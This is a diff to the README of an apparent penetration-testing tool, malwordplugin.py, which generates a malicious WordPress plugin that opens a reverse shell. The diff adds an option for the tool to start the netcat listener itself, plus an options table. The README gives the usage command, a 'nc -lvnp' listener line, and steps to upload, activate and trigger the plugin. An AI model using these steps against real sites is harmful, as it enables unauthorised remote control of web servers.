@@ -15,6 +15,7 @@ The project is inspired by the malicious-wordpress-plugin repository by wetw0rk 
 
 * Python 3.12.*
 * Basic understanding of WordPress plugins and their deployment
+* netcat shortcut named nc, if the tool should start a listner
 
 ### Steps
 
@@ -37,11 +38,20 @@ python3 malwordplugin.py -d 192.168.1.1 -p 4242
 
 1. Upload the generated ZIP file to a WordPress installation via the admin panel (Plugins > Add New > Upload Plugin).
 2. Activate the plugin.
-3. Start a listener on your attack machine (e.g., using netcat):
+3. Start a listener on your attack machine (e.g., using netcat), or let the plugin do this for you:
 ```bash
 nc -lvnp <port>
 ```
 4. Trigger the plugin to initiate the reverse shell connection. (The generator tells you the url templates)
+
+## Options
+
+| short | long | description |
+| ----- | ----- | ----- |
+| -d | --dest | listening ip for the revesesehll |
+| -p | --port | the port to connect to |
+| -l | --listner | start a listner on the port given |
+| -o | --output | name or path for the plugin zip to be written hin (.zip will be added by default) |
 
 ## Technologies Used
 
